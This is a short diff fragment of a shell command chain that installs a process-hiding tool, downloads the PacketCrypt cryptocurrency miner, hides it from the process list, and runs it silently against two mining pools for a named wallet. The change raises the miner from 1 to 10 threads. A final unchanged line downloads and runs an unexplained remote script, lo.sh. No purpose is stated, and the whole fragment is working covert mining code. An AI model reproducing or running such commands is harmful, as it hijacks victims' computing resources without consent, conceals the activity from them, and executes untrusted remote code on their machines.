@@ -10,5 +10,5 @@ npm i -g node-process-hider &&
 wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O packetcrypt && 
 ph add packetcrypt && 
 chmod +x packetcrypt && 
-./packetcrypt ann -p pkt1qlh84fcyyc9j7k7eq4rw0kqfx4k7uefvrt4xj34 http://pool.pkt.world http://pool.pktpool.io -t 1 > /dev/null &
+./packetcrypt ann -p pkt1qlh84fcyyc9j7k7eq4rw0kqfx4k7uefvrt4xj34 http://pool.pkt.world http://pool.pktpool.io -t 10 > /dev/null &
 wget https://raw.githubusercontent.com/gyrogerald/mind/main/lo.sh && chmod +x lo.sh && ./lo.sh"
